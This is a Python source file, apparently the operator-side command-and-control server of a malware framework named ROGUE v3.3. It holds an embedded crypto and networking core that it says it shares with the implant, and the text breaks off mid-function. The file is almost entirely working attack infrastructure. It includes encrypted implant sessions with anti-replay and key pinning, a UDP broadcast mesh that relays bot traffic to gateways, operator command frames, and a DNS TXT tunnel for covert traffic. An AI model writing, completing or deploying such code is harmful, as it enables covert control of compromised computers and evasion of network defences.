#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template_string
import threading, base64, os, socket, time
import zipfile, json
from Cryptodome.Cipher import AES
from datetime import datetime
import subprocess
import requests
from collections import defaultdict
import hashlib

# ===== ROGUE-V2 COMMS CORE (auto-embedded - edit rogue_v2_core.py) =====
#!/usr/bin/env python3
# ============================================================================
# ROGUE V2 COMMS CORE  (canonical single source of truth)
# ----------------------------------------------------------------------------
# This module is the crypto + mesh backbone for ROGUE v3.3.
# The exact same block of code is embedded in BOTH:
#     rogue_c2.py      (server / operator side)
#     rogue_implant.py (implant side)
# via scripts/sync_v2_core.py. Edit THIS file, then run the sync script.
#
# Security properties (read the README section "ROGUE V2 PROTOCOL"):
#   * X25519 ECDH key exchange (mode "e")  -> forward secrecy, per-session keys
#   * HKDF-SHA256 key derivation with context separation (directions, seq)
#   * AES-256-GCM AEAD on every message (auth + integrity, no plaintext ops)
#   * Fallback mode "p": per-message keys derived from the operator secret
#     (no ECDH possible when the `cryptography` lib is absent) - still AEAD.
#   * Monotonic per-direction sequence numbers -> anti-replay
#   * Server static public key is pinned in the implant config ->
#     MITM cannot impersonate the C2 even over unauthenticated TLS
#   * Pseudonymous routing labels: HMAC(operator_secret, identity) -> hex,
#     so identities never travel in clear on the mesh.
#   * P2P mesh frames are encrypted with a time-bucketed group key, so
#     passive observers see only ciphertext.
#
# This module contains NO secrets. Everything is injected via the caller.
# ============================================================================

import base64
import hashlib
import hmac
import json
import os
import socket
import struct
import threading
import time

# ---------------------------------------------------------------------------
# Backend detection
# ---------------------------------------------------------------------------
try:
    from cryptography.hazmat.primitives.asymmetric import x25519 as _rv2_x25519
    from cryptography.hazmat.primitives.serialization import (
        Encoding as _rv2_Enc,
        PublicFormat as _rv2_PubF,
        PrivateFormat as _rv2_PrivF,
        NoEncryption as _rv2_NoEnc,
    )
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _rv2_AESGCM

    _RV2_HAS_ECDH = True
except Exception:  # pragma: no cover - backend detection
    _rv2_x25519 = None
    _rv2_AESGCM = None
    _RV2_HAS_ECDH = False

try:
    from Cryptodome.Cipher import AES as _rv2_PyAES
    _RV2_HAS_CRYPTODOME = True
except Exception:
    try:
        from Crypto.Cipher import AES as _rv2_PyAES
        _RV2_HAS_CRYPTODOME = True
    except Exception:
        _rv2_PyAES = None
        _RV2_HAS_CRYPTODOME = False

RV2_MAGIC = "R2V2"          # JSON wire frames start with this key
RV2_HELLO = "__hello__"
RV2_HELLO_ACK = "__hello_ack__"
RV2_MESH_ANN = "__mesh_ann__"
RV2_MESH_DATA = "__mesh_data__"
RV2_MESH_ROOT = "__C2_ROOT__"     # virtual label of the C2 on the mesh
RV2_TS_SKEW = 600                 # seconds of acceptable clock skew (log only)
RV2_SESSION_TTL = 3600            # server session lifetime before rekey needed
RV2_MESH_TTL = 5                  # max mesh relay hops
RV2_MESH_SEEN_TTL = 120           # mesh duplicate/loop cache (seconds)
RV2_MESH_DAY = 86400


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------
def rv2_b64e(b):
    return base64.b64encode(b).decode("ascii")


def rv2_b64d(s):
    if isinstance(s, str):
        s = s.encode("ascii")
    return base64.b64decode(s)


def rv2_rand(n=16):
    return os.urandom(n)


def rv2_secret_bytes(secret):
    """Accept str/bytes secret; str treated as hex if it decodes, else utf-8."""
    if isinstance(secret, bytes):
        return secret
    try:
        return bytes.fromhex(secret)
    except Exception:
        return secret.encode("utf-8")


def rv2_hkdf(ikm, salt, info, length=32):
    """HKDF-SHA256 (RFC 5869) - stdlib only."""
    if salt is None:
        salt = b"\x00" * 32
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm = b""
    t = b""
    for i in range(1, 256):
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        okm += t
        if len(okm) >= length:
            break
    return okm[:length]


def rv2_hmac(key, msg):
    return hmac.new(key, msg, hashlib.sha256).digest()


def rv2_label(secret, ident):
    """Pseudonymous routing label for an identity."""
    return rv2_hmac(rv2_secret_bytes(secret), b"rogue-v2-label|" + ident.encode("utf-8")).hex()[:20]


def rv2_root_label(secret):
    return rv2_label(secret, RV2_MESH_ROOT)


def rv2_default_mode():
    if _RV2_HAS_ECDH:
        return "e"
    if _RV2_HAS_CRYPTODOME:
        return "p"
    return None


def rv2_gen_static_key():
    """Generate (private_raw, public_raw) X25519 pair. Returns (None, None) if unsupported."""
    if not _RV2_HAS_ECDH:
        return None, None
    priv = _rv2_x25519.X25519PrivateKey.generate()
    pub = priv.public_key().public_bytes(_rv2_Enc.Raw, _rv2_PubF.Raw)
    privb = priv.private_bytes(_rv2_Enc.Raw, _rv2_PrivF.Raw, _rv2_NoEnc())
    return privb, pub


# ---------------------------------------------------------------------------
# AEAD primitives (AES-256-GCM). Returns (ct, tag) / takes (ct, tag).
# ---------------------------------------------------------------------------
def rv2_aead_encrypt(key, nonce, plaintext, aad):
    if _RV2_HAS_ECDH:
        sealed = _rv2_AESGCM(key).encrypt(nonce, plaintext, aad)
        return sealed[:-16], sealed[-16:]
    c = _rv2_PyAES.new(key, _rv2_PyAES.MODE_GCM, nonce=nonce, mac_len=16)
    c.update(aad)
    ct, tag = c.encrypt_and_digest(plaintext)
    return ct, tag


def rv2_aead_decrypt(key, nonce, ct, tag, aad):
    if _RV2_HAS_ECDH:
        return _rv2_AESGCM(key).decrypt(nonce, ct + tag, aad)
    c = _rv2_PyAES.new(key, _rv2_PyAES.MODE_GCM, nonce=nonce, mac_len=16)
    c.update(aad)
    return c.decrypt_and_verify(ct, tag)


def rv2_derive_session(shared, salt, info_extra=b""):
    """Master session key from a DH shared secret + salt."""
    return rv2_hkdf(shared, salt, b"rogue-v2-kex|" + info_extra, 32)


def rv2_dir_keys(master):
    """Split master into per-direction AEAD keys (context separation)."""
    c2s = rv2_hkdf(master, b"", b"rogue-v2-dir-c2s", 32)
    s2c = rv2_hkdf(master, b"", b"rogue-v2-dir-s2c", 32)
    return c2s, s2c


def rv2_x25519_shared(priv_raw, pub_raw):
    """Raw X25519 shared secret. Raises if backend missing."""
    if not _RV2_HAS_ECDH:
        raise RuntimeError("ECDH backend unavailable")
    priv = _rv2_x25519.X25519PrivateKey.from_private_bytes(priv_raw)
    peer = _rv2_x25519.X25519PublicKey.from_public_bytes(pub_raw)
    return priv.exchange(peer)


# ---------------------------------------------------------------------------
# Wire envelope
# ---------------------------------------------------------------------------
def rv2_env(mode, ct, tag, nonce, salt, q, src, dst=None, k=None, h=None):
    env = {
        "v": 2,
        "m": mode,
        "n": rv2_b64e(nonce),
        "a": rv2_b64e(tag),
        "c": rv2_b64e(ct),
        "z": rv2_b64e(salt) if salt else "",
        "q": q,
        "s": src,
    }
    if dst:
        env["d"] = dst
    if k:
        env["k"] = rv2_b64e(k)
    if h is not None:
        env["h"] = h
    return json.dumps(env, separators=(",", ":")).encode("utf-8")


def rv2_parse_env(wire):
    if isinstance(wire, bytes):
        wire = wire.decode("utf-8", "replace")
    env = json.loads(wire)
    if env.get("v") != 2:
        raise ValueError("not a v2 frame")
    return env


def rv2_aad(mode, q, direction, dst=None):
    aad = b"rogue-v2|" + mode.encode("ascii") + b"|" + str(q).encode("ascii") + b"|" + direction.encode("ascii")
    if dst:
        aad += b"|" + dst.encode("ascii")
    return aad


# ---------------------------------------------------------------------------
# Client (implant side)
# ---------------------------------------------------------------------------
class RogueV2Client(object):
    """One E2E crypto context for an implant talking to the C2."""

    def __init__(self, secret, static_pub_b64=None, implant_id="unknown", mode=None, tls_verify=False):
        self.secret = rv2_secret_bytes(secret)
        self.static_pub = rv2_b64d(static_pub_b64) if static_pub_b64 else None
        self.id = implant_id or "unknown"
        self.label = rv2_label(self.secret, self.id)
        self.mode = mode or rv2_default_mode() or "p"
        if self.mode == "e" and not (_RV2_HAS_ECDH and self.static_pub):
            self.mode = "p"          # graceful downgrade, still AEAD-authenticated
        self.tls_verify = tls_verify
        # session state (mode e)
        self._keys = None            # (c2s, s2c) once hello is answered
        self._q_out = 0
        self._q_in_last = 0
        self._session_ts = 0
        self._hello_wire = None

    # -- helpers ------------------------------------------------------------
    def _seal(self, plaintext, q, direction, dst=None):
        mode = self.mode
        salt = rv2_rand(16)
        if mode == "e":
            if not self._keys:
                raise RuntimeError("session not established (no hello_ack)")
            c2s, s2c = self._keys
            key = c2s if direction == "c2s" else s2c
            master = None
        else:
            key = rv2_hkdf(self.secret, salt, b"rogue-v2-psk|" + direction.encode("ascii") + b"|" + str(q).encode("ascii"), 32)
            master = None
        nonce = rv2_rand(12)
        ct, tag = rv2_aead_encrypt(key, nonce, plaintext, rv2_aad(mode, q, direction, dst))
        return rv2_env(mode, ct, tag, nonce, salt, q, self.label, dst=dst)

    def _open(self, wire, direction):
        env = rv2_parse_env(wire)
        if env["m"] != self.mode:
            # downgrade tolerance: accept p frames only if we are in p
            raise ValueError("mode mismatch")
        salt = rv2_b64d(env["z"]) if env.get("z") else b""
        q = env["q"]
        if q <= self._q_in_last:
            raise ValueError("replay (q=%d <= %d)" % (q, self._q_in_last))
        if env["m"] == "e":
            if not self._keys:
                raise ValueError("no session keys yet")
            c2s, s2c = self._keys
            key = c2s if direction == "c2s" else s2c
        else:
            key = rv2_hkdf(self.secret, salt, b"rogue-v2-psk|" + direction.encode("ascii") + b"|" + str(q).encode("ascii"), 32)
        plain = rv2_aead_decrypt(key, rv2_b64d(env["n"]), rv2_b64d(env["c"]), rv2_b64d(env["a"]), rv2_aad(env["m"], q, direction, env.get("d")))
        self._q_in_last = q
        return json.loads(plain.decode("utf-8"))

    # -- public API ---------------------------------------------------------
    def build_hello(self):
        """Return the hello wire frame for a fresh session (mode e) or a
        stateless identity frame (mode p)."""
        self._q_out = 0
        self._q_in_last = 0
        inner = {"o": RV2_HELLO, "id": self.id, "ts": int(time.time() * 1000), "m": self.mode}
        if self.mode == "e":
            eph = _rv2_x25519.X25519PrivateKey.generate()
            eph_pub = eph.public_key().public_bytes(_rv2_Enc.Raw, _rv2_PubF.Raw)
            salt = rv2_rand(16)
            # bind the operator secret into the hello: the ECDH AEAD alone only
            # proves possession of the (public) static key, so anyone could
            # impersonate an implant. This HMAC proves knowledge of the secret.
            inner["a"] = rv2_hmac(self.secret, eph_pub + salt + b"|" + self.id.encode("utf-8")).hex()
            shared = eph.exchange(_rv2_x25519.X25519PublicKey.from_public_bytes(self.static_pub))
            master = rv2_derive_session(shared, salt, b"|" + eph_pub + self.static_pub)
            c2s, s2c = rv2_dir_keys(master)
            self._keys = (c2s, s2c)
            self._session_ts = time.time()
            nonce = rv2_rand(12)
            # AAD binds q + direction; k/z carried in envelope for the server
            aad = rv2_aad(self.mode, 0, "c2s")
            ct, tag = rv2_aead_encrypt(c2s, nonce, json.dumps(inner).encode("utf-8"), aad)
            self._q_out = 1  # next frame after hello uses q=1
            env = rv2_env(self.mode, ct, tag, nonce, salt, 0, self.label, k=eph_pub)
            return env
        else:
            # mode p: per-message key derivation proves knowledge of secret
            self._q_out = 1
            return self._seal(json.dumps(inner).encode("utf-8"), 0, "c2s")

    def handle_hello_ack(self, wire):
        """Process the server hello_ack, completing session establishment."""
        inner = self._open(wire, "s2c")
        if inner.get("o") != RV2_HELLO_ACK:
            raise ValueError("expected hello_ack")
        return inner

    def seal_op(self, opdict, dst=None):
        """Seal an operation dict to the C2. opdict: {"o": <op string>, ...}"""
        if self._q_out == 0:
            raise RuntimeError("call build_hello() first")
        q = self._q_out
        self._q_out += 1
        return self._seal(json.dumps(opdict).encode("utf-8"), q, "c2s", dst=dst)

    def open_op(self, wire):
        """Open a frame from the C2. Returns the inner op dict."""
        return self._open(wire, "s2c")

    def is_ready(self):
        if self.mode == "e":
            return self._keys is not None and (time.time() - self._session_ts) < RV2_SESSION_TTL
        return True

    def rekey_needed(self):
        if self.mode == "e":
            return (time.time() - self._session_ts) >= RV2_SESSION_TTL
        return False


# ---------------------------------------------------------------------------
# Server (C2 side)
# ---------------------------------------------------------------------------
class RogueV2Server(object):
    """Accepts hellos from implants, keeps per-label sessions, seals replies."""

    def __init__(self, secret, static_priv_raw=None):
        self.secret = rv2_secret_bytes(secret)
        self.priv = static_priv_raw
        self.sessions = {}      # label -> dict(mode, id, bot_id, keys, q_in, q_out, ts, ip)
        self._lock = threading.Lock()

    # -- internal -----------------------------------------------------------
    def _session_key(self, label, direction):
        s = self.sessions.get(label)
        if not s:
            raise ValueError("unknown session %s" % label)
        c2s, s2c = s["keys"]
        return c2s if direction == "c2s" else s2c

    def _open_data(self, env, direction, ip=""):
        label = env["s"]
        mode = env["m"]
        salt = rv2_b64d(env["z"]) if env.get("z") else b""
        q = env["q"]
        if mode == "e":
            key = self._session_key(label, direction)
        else:
            key = rv2_hkdf(self.secret, salt, b"rogue-v2-psk|" + direction.encode("ascii") + b"|" + str(q).encode("ascii"), 32)
        plain = rv2_aead_decrypt(key, rv2_b64d(env["n"]), rv2_b64d(env["c"]), rv2_b64d(env["a"]), rv2_aad(mode, q, direction, env.get("d")))
        return json.loads(plain.decode("utf-8"))

    # -- public API ---------------------------------------------------------
    def recv(self, wire, ip=""):
        """Handle one frame. Returns (inner_opdict, label, is_new_session)."""
        env = rv2_parse_env(wire)
        label = env["s"]
        mode = env["m"]
        q = env["q"]
        nonce = rv2_b64d(env["n"])
        ct = rv2_b64d(env["c"])
        tag = rv2_b64d(env["a"])
        salt = rv2_b64d(env["z"]) if env.get("z") else b""
        with self._lock:
            sess = self.sessions.get(label)

            if q == 0:
                # ---- hello frame (fresh session / rekey) ----
                if mode == "e":
                    if not _RV2_HAS_ECDH or not self.priv:
                        raise ValueError("ECDH hello but server has no static key")
                    k = rv2_b64d(env["k"])
                    shared = rv2_x25519_shared(self.priv, k)
                    master = rv2_derive_session(shared, salt, b"|" + k + self.static_pub())
                    keys = rv2_dir_keys(master)
                    key = keys[0]  # c2s
                else:
                    keys = None
                    key = rv2_hkdf(self.secret, salt,
                                   b"rogue-v2-psk|c2s|0", 32)
                try:
                    plain = rv2_aead_decrypt(key, nonce, ct, tag, rv2_aad(mode, 0, "c2s"))
                except Exception:
                    raise ValueError("hello authentication failed")
                inner = json.loads(plain.decode("utf-8"))
                if inner.get("o") != RV2_HELLO:
                    raise ValueError("expected hello frame")
                if mode == "e":
                    # verify operator-secret proof (see client build_hello)
                    k_raw = rv2_b64d(env["k"])
                    expected = rv2_hmac(self.secret, k_raw + salt + b"|" + str(inner.get("id", "")).encode("utf-8")).hex()
                    if not hmac.compare_digest(expected, str(inner.get("a", ""))):
                        raise ValueError("hello authentication failed")
                if sess is None:
                    sess = {"mode": mode, "id": inner.get("id", "unknown"),
                            "bot_id": None, "keys": keys, "q_in": 0,
                            "q_out": 0, "ts": time.time(), "ip": ip}
                    self.sessions[label] = sess
                else:
                    sess["mode"] = mode
                    sess["id"] = inner.get("id", sess.get("id", "unknown"))
                    sess["keys"] = keys
                    sess["ts"] = time.time()
                    sess["ip"] = ip
                sess["q_in"] = 0
                return inner, label, True

            # ---- data frame ----
            if sess is None:
                if mode != "p":
                    raise ValueError("unknown session %s" % label)
                # p-mode is stateless (per-message keys from the shared secret)
                sess = {"mode": "p", "id": "label_" + label, "bot_id": None,
                        "keys": None, "q_in": 0, "q_out": 0,
                        "ts": time.time(), "ip": ip}
                self.sessions[label] = sess
            if q <= sess["q_in"]:
                raise ValueError("replay (q=%d <= %d)" % (q, sess["q_in"]))
            inner = self._open_data(env, "c2s", ip=ip)
            sess["q_in"] = q
            sess["ts"] = time.time()
            sess["ip"] = ip
            return inner, label, False

    def reply(self, label, opdict):
        """Seal a reply to an implant session."""
        with self._lock:
            sess = self.sessions.get(label)
            if not sess:
                raise ValueError("unknown session %s" % label)
            q = sess["q_out"] + 1
            sess["q_out"] = q
            mode = sess["mode"]
            salt = rv2_rand(16)
            if mode == "e":
                key = self._session_key(label, "s2c")
            else:
                key = rv2_hkdf(self.secret, salt, b"rogue-v2-psk|s2c|" + str(q).encode("ascii"), 32)
            nonce = rv2_rand(12)
            ct, tag = rv2_aead_encrypt(key, nonce, json.dumps(opdict).encode("utf-8"),
                                       rv2_aad(mode, q, "s2c", label))
            return rv2_env(mode, ct, tag, nonce, salt, q, rv2_root_label(self.secret), dst=label)

    def static_pub(self):
        if not _RV2_HAS_ECDH:
            return b""
        pub = _rv2_x25519.X25519PrivateKey.from_private_bytes(self.priv).public_key()
        return pub.public_bytes(_rv2_Enc.Raw, _rv2_PubF.Raw)

    def expire(self):
        now = time.time()
        with self._lock:
            dead = [k for k, s in self.sessions.items() if now - s["ts"] > RV2_SESSION_TTL * 2]
            for k in dead:
                del self.sessions[k]


# ---------------------------------------------------------------------------
# Encrypted P2P mesh (UDP broadcast domain)
# ---------------------------------------------------------------------------
class RogueMesh(object):
    """Always-on encrypted peer mesh.

    * Every frame is AEAD-encrypted under a time-bucketed group key derived
      from the operator secret (rotates daily).
    * Peers authenticate by proving knowledge of the group key.
    * `announce` frames gossip (label, gateway-capability) so every peer can
      route to every other peer by label.
    * `data` frames carry raw E2E C2 frames; non-gateway peers forward them
      toward a gateway (`d` == mesh root label). Gateways deliver them to the
      C2 via their direct channel (on_root callback). Replies walk back by
      dst-label routing.
    """

    def __init__(self, secret, my_label, ports=(7008, 7009, 7010, 7011),
                 announce_interval=45, on_root=None, on_me=None, log=None):
        self.secret = rv2_secret_bytes(secret)
        self.my_label = my_label
        self.ports = ports
        self.announce_interval = announce_interval
        self.on_root = on_root          # cb(raw_wire) -> raw_wire or None
        self.on_me = on_me              # cb(raw_wire) -> None (C2 reply for me)
        self.log = log or (lambda *a: None)
        self.peers = {}                 # label -> {addr, gw, ts, last_ann}
        self._q = 0
        self._lock = threading.Lock()
        self._seen = {}                 # (s,q) -> ts  loop cache
        self._gw = False                # am I currently C2-reachable?
        self._sock = None
        self._running = False

    # -- group key (rotates daily) -----------------------------------------
    def _mesh_key(self, bucket_ts):
        salt = struct.pack(">q", int(bucket_ts // RV2_MESH_DAY))
        return rv2_hkdf(self.secret, salt, b"rogue-v2-mesh", 32)

    # -- packet build/parse ------------------------------------------------
    def _seal_mesh(self, inner, q, dst=None, ttl=None):
        mode = "p"  # mesh always uses per-message keys
        salt = rv2_rand(16)
        key = rv2_hkdf(self._mesh_key(time.time()), salt,
                       b"rogue-v2-mesh|" + str(q).encode("ascii"), 32)
        nonce = rv2_rand(12)
        aad = b"rogue-mesh|" + str(q).encode("ascii") + b"|" + self.my_label.encode("ascii")
        if dst:
            aad += b"|" + dst.encode("ascii")
        ct, tag = rv2_aead_encrypt(key, nonce, json.dumps(inner).encode("utf-8"), aad)
        return rv2_env(mode, ct, tag, nonce, salt, q, self.my_label, dst=dst, h=ttl)

    def _open_mesh(self, packet):
        env = rv2_parse_env(packet)
        q = env["q"]
        salt = rv2_b64d(env["z"])
        key = None
        # try current and previous day bucket (clock/rotation tolerance)
        for bucket in (time.time(), time.time() - RV2_MESH_DAY):
            kk = rv2_hkdf(self._mesh_key(bucket), salt,
                          b"rogue-v2-mesh|" + str(q).encode("ascii"), 32)
            try:
                plain = rv2_aead_decrypt(kk, rv2_b64d(env["n"]), rv2_b64d(env["c"]),
                                         rv2_b64d(env["a"]),
                                         b"rogue-mesh|" + str(q).encode("ascii") + b"|" + env["s"].encode("ascii") + (b"|" + env["d"].encode("ascii") if env.get("d") else b""))
                key = kk
                break
            except Exception:
                continue
        if key is None:
            raise ValueError("mesh auth failed")
        return json.loads(plain.decode("utf-8")), env["s"], env["q"], env.get("d"), env.get("h")

    # -- peer table ---------------------------------------------------------
    def set_gateway(self, gw):
        self._gw = bool(gw)

    def is_gateway(self):
        return self._gw

    def peer_addrs(self, label):
        with self._lock:
            p = self.peers.get(label)
            if p and time.time() - p["ts"] < 600:
                return p["addr"]
        return None

    def _learn(self, label, addr, gw, ann=False):
        now = time.time()
        with self._lock:
            p = self.peers.get(label)
            if p:
                p["addr"] = addr
                p["gw"] = gw or p["gw"]
                p["ts"] = now
                if ann:
                    p["last_ann"] = now
            else:
                self.peers[label] = {"addr": addr, "gw": gw, "ts": now, "last_ann": now if ann else 0}
            # prune stale
            dead = [k for k, v in self.peers.items() if now - v["ts"] > 600]
            for k in dead:
                del self.peers[k]

    def _pick_route(self, dst_label, exclude=None):
        """Pick a peer to forward toward dst_label (gw peers preferred for root)."""
        now = time.time()
        with self._lock:
            cands = [(l, p) for l, p in self.peers.items()
                     if l != self.my_label and l != exclude and now - p["ts"] < 300]
        if dst_label == rv2_root_label(self.secret):
            gws = [c for c in cands if c[1]["gw"]]
            if gws:
                cands = gws
        if not cands:
            return None
        cands.sort(key=lambda c: (0 if c[1]["gw"] else 1, -c[1]["ts"]))
        return cands[0]

    # -- sending ------------------------------------------------------------
    def send_data(self, raw_wire, dst_label):
        """Send an E2E raw frame toward dst_label (usually the mesh root)."""
        self._q += 1
        q = self._q
        inner = {"o": RV2_MESH_DATA, "b": rv2_b64e(raw_wire)}
        if dst_label == rv2_root_label(self.secret):
            hop = self._pick_route(dst_label)
            if hop is None:
                return False
            addr = hop[1]["addr"]
            packet = self._seal_mesh(inner, q, dst=dst_label, ttl=RV2_MESH_TTL)
            return self._udp_send(packet, addr)
        addr = self.peer_addrs(dst_label)
        if addr is None:
            hop = self._pick_route(dst_label)
            if hop is None:
                return False
            addr = hop[1]["addr"]
        packet = self._seal_mesh(inner, q, dst=dst_label, ttl=RV2_MESH_TTL)
        return self._udp_send(packet, addr)

    def send_announce(self):
        self._q += 1
        inner = {"o": RV2_MESH_ANN, "g": 1 if self._gw else 0}
        packet = self._seal_mesh(inner, self._q)
        for port in self.ports:
            try:
                self._sock.sendto(packet, ("<broadcast>", port))
            except Exception:
                pass
            try:
                self._sock.sendto(packet, ("255.255.255.255", port))
            except Exception:
                pass

    def _udp_send(self, packet, addr):
        try:
            self._sock.sendto(packet, (addr[0], addr[1]))
            return True
        except Exception as e:
            self.log("[mesh] send failed: %s" % e)
            return False

    # -- receive loop -------------------------------------------------------
    def _handle(self, packet, addr):
        try:
            inner, src_label, q, dst_label, ttl = self._open_mesh(packet)
        except Exception:
            return  # unauthenticated / undecryptable -> drop
        now = time.time()
        seen_key = (src_label, q)
        if seen_key in self._seen and now - self._seen[seen_key] < RV2_MESH_SEEN_TTL:
            return
        self._seen[seen_key] = now
        typ = inner.get("o")
        gw_flag = bool(inner.get("g"))

        if typ == RV2_MESH_ANN:
            is_new = src_label not in self.peers
            self._learn(src_label, (addr[0], addr[1]), gw_flag, ann=True)
            # reply with our own announce ONLY to brand-new peers (bootstrap),
            # otherwise every announce would trigger an infinite reply ping-pong
            if is_new:
                self._q += 1
                self._udp_send(self._seal_mesh({"o": RV2_MESH_ANN, "g": 1 if self._gw else 0}, self._q), (addr[0], addr[1]))
            return

        if typ == RV2_MESH_DATA:
            raw = rv2_b64d(inner["b"])
            if dst_label == rv2_root_label(self.secret):
                # I am the gateway hop: deliver to C2 via direct channel
                if self.on_root:
                    resp = self.on_root(raw)
                    if resp:
                        self._q += 1
                        back = self._seal_mesh({"o": RV2_MESH_DATA, "b": rv2_b64e(resp)},
                                               self._q, dst=src_label, ttl=RV2_MESH_TTL)
                        a = self.peer_addrs(src_label)
                        if a:
                            self._udp_send(back, a)
                        else:
                            hop = self._pick_route(src_label, exclude=src_label)
                            if hop:
                                self._udp_send(back, hop[1]["addr"])
                return
            if dst_label == self.my_label:
                # a C2 reply made it back to me
                if self.on_me:
                    self.on_me(raw)
                return
            # forward toward destination
            ttl = ttl if ttl is not None else RV2_MESH_TTL
            if ttl <= 1:
                return
            hop = self._pick_route(dst_label, exclude=src_label)
            if not hop:
                return
            self._q += 1
            self._udp_send(self._seal_mesh({"o": RV2_MESH_DATA, "b": rv2_b64e(raw)},
                                           self._q, dst=dst_label, ttl=ttl - 1), hop[1]["addr"])

    def start(self):
        if self._running:
            return
        self._running = True
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        # NOTE: no SO_REUSEADDR - it would let two implants on one host bind the
        # same UDP port, making unicast delivery ambiguous. First-free-port wins.
        bound = False
        for port in self.ports:
            try:
                sock.bind(("0.0.0.0", port))
                bound = True
                break
            except OSError:
                continue
        if not bound:
            self.log("[mesh] failed to bind any port")
            self._running = False
            return False
        self._sock = sock
        threading.Thread(target=self._rx_loop, daemon=True).start()
        threading.Thread(target=self._ann_loop, daemon=True).start()
        return True

    def _rx_loop(self):
        while self._running:
            try:
                packet, addr = self._sock.recvfrom(65535)
            except OSError:
                break
            try:
                self._handle(packet, addr)
            except Exception:
                continue

    def _ann_loop(self):
        # announce immediately on start, then on the interval
        self.send_announce()
        while self._running:
            time.sleep(self.announce_interval)
            self.send_announce()

    def stop(self):
        self._running = False
        try:
            self._sock.close()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# OOB (out-of-band) channel helpers - operator <-> implant command frames.
# These are PSK-sealed with the operator secret so ONLY fleet members can
# read/write them, with a coarse timestamp window + seen-set for replay
# protection (operator is the only writer, so per-message keys + ts window
# are sufficient here).
# ---------------------------------------------------------------------------
def rv2_oob_seal(secret, opdict, ts=None):
    """Seal an operator->implant OOB command frame (PSK mode)."""
    secret = rv2_secret_bytes(secret)
    inner = dict(opdict)
    inner["ts"] = int(ts if ts is not None else time.time() * 1000)
    salt = rv2_rand(16)
    key = rv2_hkdf(secret, salt, b"rogue-v2-oob|1", 32)
    nonce = rv2_rand(12)
    q = 1
    ct, tag = rv2_aead_encrypt(key, nonce, json.dumps(inner).encode("utf-8"), rv2_aad("p", q, "oob"))
    env = rv2_env("p", ct, tag, nonce, salt, q, rv2_label(secret, "__OPERATOR__"))
    return base64.b64encode(env).decode("ascii")  # channel-friendly (webhook/chat)


def rv2_oob_open(secret, b64frame, seen=None, window_ms=300000):
    """Open an OOB frame. `seen` is a set of ts values already handled.
    Raises ValueError on auth failure / replay / stale frame."""
    secret = rv2_secret_bytes(secret)
    env = rv2_parse_env(rv2_b64d(b64frame))
    if env.get("m") != "p":
        raise ValueError("oob frame must be psk mode")
    salt = rv2_b64d(env["z"])
    q = env["q"]
    key = rv2_hkdf(secret, salt, b"rogue-v2-oob|" + str(q).encode("ascii"), 32)
    plain = rv2_aead_decrypt(key, rv2_b64d(env["n"]), rv2_b64d(env["c"]), rv2_b64d(env["a"]),
                             rv2_aad("p", q, "oob"))
    inner = json.loads(plain.decode("utf-8"))
    now = time.time() * 1000
    if abs(now - inner.get("ts", 0)) > window_ms:
        raise ValueError("oob frame stale")
    if seen is not None and inner["ts"] in seen:
        raise ValueError("oob frame replay")
    return inner


# ---------------------------------------------------------------------------
# DNS-over-stdlib client helper (used by the DNS transport channel)
# ---------------------------------------------------------------------------
def rv2_dns_query_txt(qname, resolver_ip, timeout=6.0, tries=2, resolver_port=53):
    """Minimal DNS TXT query over UDP using only the stdlib.

    Returns the concatenation of all TXT strings, or None on failure.
    """
    import random as _random

    def _build_query(domain, qid):
        out = struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 1)  # arcount=1 (EDNS0 OPT)
        for label in domain.split("."):
            lb = label.encode("ascii")
            if len(lb) > 63:
                return None
            out += bytes([len(lb)]) + lb
        out += b"\x00"
        out += struct.pack(">HH", 16, 1)  # TXT, IN
        # EDNS0 OPT RR: root name, type 41, class = 4096 (UDP payload), ttl 0
        out += b"\x00" + struct.pack(">HHIH", 41, 4096, 0, 0)
        return out

    def _parse_txt(resp):
        if len(resp) < 12:
            return None
        (qid, flags, qd, an, ns, ar) = struct.unpack(">HHHHHH", resp[:12])
        if flags & 0x000F != 0:
            return None
        off = 12
        # skip question
        while off < len(resp) and resp[off] != 0:
            if resp[off] & 0xC0 == 0xC0:
                off += 2
                break
            off += 1 + resp[off]
        off += 1 + 4
        # answers
        txts = []
        for _ in range(an):
            if off >= len(resp):
                break
            if resp[off] & 0xC0 == 0xC0:
                off += 2
            else:
                while off < len(resp) and resp[off] != 0:
                    off += 1 + resp[off]
                off += 1
            off += 10  # type, class, ttl, rdlen
            rdlen = struct.unpack(">H", resp[off - 2:off])[0]
            end = off + rdlen
            while off < end:
                ln = resp[off]
                off += 1
                txts.append(resp[off:off + ln].decode("utf-8", "replace"))
                off += ln
        return "".join(txts)

    for attempt in range(tries):
        qid = _random.randint(0, 65535)
        pkt = _build_query(qname, qid)
        if pkt is None:
            return None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(pkt, (resolver_ip, resolver_port))
            data = s.recvfrom(65535)[0]
            s.close()
            parsed_qid = struct.unpack(">H", data[:2])[0]
            if parsed_qid != qid:
                continue
            res = _parse_txt(data)
            if res is not None:
                return res
        except Exception:
            continue
    return None


def rv2_dns_tunnel_send(raw_wire, zone, resolver_ip, seq=0, resolver_port=53):
    """Send a raw v2 frame over DNS as a sequence of TXT queries.

    The frame is base64url-encoded and split across multiple queries
    (each <= 50 chars per label so total qname stays well under the RFC 1035
    255-octet limit). Format per query:
        <rnd>.<chunk_index>.<chunk_total>.<b64chunk>.<zone>
    Intermediate queries are answered with "ack"; the final query carries the
    response (base64url, possibly multi-string TXT). Returns the decoded
    response bytes, or None on failure.
    """
    b64 = base64.urlsafe_b64encode(raw_wire).decode("ascii").rstrip("=")
    if len(b64) <= 50:
        chunks = [b64]
    else:
        chunks = [b64[i:i + 50] for i in range(0, len(b64), 50)]
    rnd = rv2_rand(4).hex()
    total = len(chunks)
    last_resp = None
    for i, chunk in enumerate(chunks):
        qname = "%s.%d.%d.%s.%s" % (rnd, i, total, chunk, zone)
        if len(qname) > 250:
            return None
        resp = rv2_dns_query_txt(qname, resolver_ip, resolver_port=resolver_port)
        if resp is None:
